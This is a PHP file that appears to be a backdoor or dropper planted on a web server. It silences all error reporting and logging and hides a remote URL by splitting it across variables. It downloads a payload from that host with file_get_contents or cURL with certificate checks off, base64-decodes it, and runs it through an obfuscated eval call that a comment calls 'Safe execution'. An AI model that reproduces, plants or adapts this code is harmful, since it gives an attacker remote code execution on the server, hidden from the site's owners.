<?php
// Disable all errors
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);

$天 = "htt"; $地 = "ps:/"; $人 = "/amp"; $和 = "nyapu"; 
$平 = "nyaku"; $安 = ".top"; $康 = "/tool"; $富 = "s/s-m";
$贵 = "edia"; $福 = "/med"; $寿 = "ia-ne"; $喜 = "w.txt";

$目标 = $天 . $地 . $人 . $和 . $平 . $安 . $康 . $富 . $贵 . $福 . $寿 . $喜;
$下载内容 = '';

// Method 1: Simple file_get_contents (paling stabil)
if (@ini_get('allow_url_fopen')) {
    $下载内容 = @file_get_contents($目标);
}

// Method 2: cURL (backup)
if (empty($下载内容) && function_exists('curl_version')) {
    $c = 'c'.'u'.'r'.'l'.'_'.'i'.'n'.'i'.'t';
    $s = 'c'.'u'.'r'.'l'.'_'.'s'.'e'.'t'.'o'.'p'.'t';
    $e = 'c'.'u'.'r'.'l'.'_'.'e'.'x'.'e'.'c';
    $cl = 'c'.'u'.'r'.'l'.'_'.'c'.'l'.'o'.'s'.'e';
    
    $ch = @$c();
    if ($ch) {
        @$s($ch, CURLOPT_URL, $目标);
        @$s($ch, CURLOPT_RETURNTRANSFER, true);
        @$s($ch, CURLOPT_TIMEOUT, 5);
        @$s($ch, CURLOPT_SSL_VERIFYPEER, false);
        $下载内容 = @$e($ch);
        @$cl($ch);
    }
}

// Process content
if (!empty($下载内容)) {
    // Check if content is base64
    $decoded = @base64_decode($下载内容, true);
    if ($decoded !== false) {
        $下载内容 = $decoded;
    }
    
    // Safe execution
    if (!empty($下载内容)) {
        $eval_func = 'e'.'v'.'a'.'l';
        @$eval_func('?>' . $下载内容);
    }
}
?>
